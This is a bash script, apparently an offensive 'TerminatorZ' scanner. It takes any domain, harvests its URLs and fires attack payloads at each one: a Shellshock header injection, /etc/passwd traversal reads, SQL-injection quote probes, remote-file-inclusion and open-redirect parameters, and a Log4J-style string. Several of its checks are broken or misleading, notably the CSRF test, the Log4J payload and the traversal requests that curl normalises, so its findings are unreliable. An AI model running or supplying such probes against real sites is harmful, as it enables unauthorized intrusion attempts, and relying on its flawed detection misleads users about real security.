#!/bin/bash

curl --silent "https://raw.githubusercontent.com/blackhatethicalhacking/Subdomain_Bruteforce_bheh/main/ascii.sh" | lolcat
echo ""
# Generate a random Sun Tzu quote for offensive security

# Array of Sun Tzu quotes
quotes=("The supreme art of war is to subdue the enemy without fighting." "All warfare is based on deception." "He who knows when he can fight and when he cannot, will be victorious." "The whole secret lies in confusing the enemy, so that he cannot fathom our real intent." "To win one hundred victories in one hundred battles is not the acme of skill. To subdue the enemy without fighting is the acme of skill.")

# Get a random quote from the array
random_quote=${quotes[$RANDOM % ${#quotes[@]}]}

# Print the quote
echo "Offensive security tip: $random_quote - Sun Tzu" | lolcat
sleep 1
figlet "HACK THE PLANET!" | lolcat
sleep 1
echo "MEANS, IT'S ☕ 1337 ⚡ TIME, 369 ☯ " | lolcat
sleep 1
echo "[YOUR ARE USING TerminatorZ.sh] - (v1.0) CODED BY Chris 'SaintDruG' Abou-Chabké WITH ❤ FOR blackhatethicalhacking.com for Educational Purposes only!" | lolcat
sleep 1
#check if the user is connected to the internet
tput bold;echo "CHECKING IF YOU ARE CONNECTED TO THE INTERNET!" | lolcat
# Check connection
wget -q --spider https://google.com
if [ $? -ne 0 ];then
    echo "++++ CONNECT TO THE INTERNET BEFORE RUNNING XSSRocket.sh!" | lolcat
    exit 1
fi
tput bold;echo "++++ CONNECTION FOUND, LET'S GO!" | lolcat

echo "Enter the domain: "
read domain

mkdir $domain

waybackurls $domain | httpx | sort -u | tee urls.txt

while read url
do
  echo "Testing $url for RCE vulnerability..."
  # Check for RCE vulnerability
  response=$(curl -s -X GET -H 'User-Agent: () { :;}; echo vulnerable' "$url")
  if [[ $response == *"vulnerable"* ]]; then
    echo "$url is RCE vulnerable" >> "$domain/$domain.txt"
  else
    echo "$url is not RCE vulnerable"
  fi

  echo "Testing $url for CSRF vulnerability..."
  # Check for CSRF vulnerability
  response=$(curl -s -X POST -d 'token=test' "$url")
  if [[ $response == *"token=test"* ]]; then
    echo "$url is CSRF vulnerable" >> "$domain/$domain.txt"
  else
    echo "$url is not CSRF vulnerable"
  fi

  echo "Testing $url for LFI vulnerability..."
  # Check for LFI vulnerability
  response=$(curl -s "$url/../../../../../etc/passwd")
  if [[ $response == *"root:"* ]]; then
    echo "$url is LFI vulnerable" >> "$domain/$domain.txt"
  else
    echo "$url is not LFI vulnerable"
  fi

  echo "Testing $url for open redirect vulnerability..."
  # Check for open redirect vulnerability
  response=$(curl -s -L "$url?redirect=http://google.com")
  if [[ $response == *"<title>Google</title>"* ]]; then
    echo "$url is open redirect vulnerable" >> "$domain/$domain.txt"
  else
    echo "$url is not open redirect vulnerable"
  fi

  echo "Testing $url for Log4J vulnerability..."
  # Check for Log4J vulnerability
  response=$(curl -s "$url/%20%20%20%20%20%20%20%20@org.apache.log4j.BasicConfigurator@configure()")
  if [[ $response == *"log4j"* ]]; then
    echo "$url is Log4J vulnerable" >> "$domain/$domain.txt"
  else
    echo "$url is not Log4J vulnerable"
  fi

  echo "Testing $url for RFI vulnerability..."
  # Check for RFI vulnerability
  response=$(curl -s "$url?file=http://google.com")
  if [[ $response == *"<title>Google</title>"* ]]; then
    echo "$url is RFI vulnerable" >> "$domain/$domain.txt"
  else
    echo "$url is not RFI vulnerable"
  fi

  echo "Testing $url for path traversal vulnerability..."
# Check for path traversal vulnerability
response=$(curl -s "$url/../../../../../etc/passwd")
if [[ $response == *"root:"* ]]; then
  echo "$url path traversal" >> "$domain/$domain.txt"
fi

# Check for SQL injection vulnerability
response=$(curl -s "$url/index.php?id=1'")
if [[ $response == *"SQL syntax"* ]]; then
  echo "$url SQL injection" >> "$domain/$domain.txt"
fi

done < urls.txt

rm urls.txt
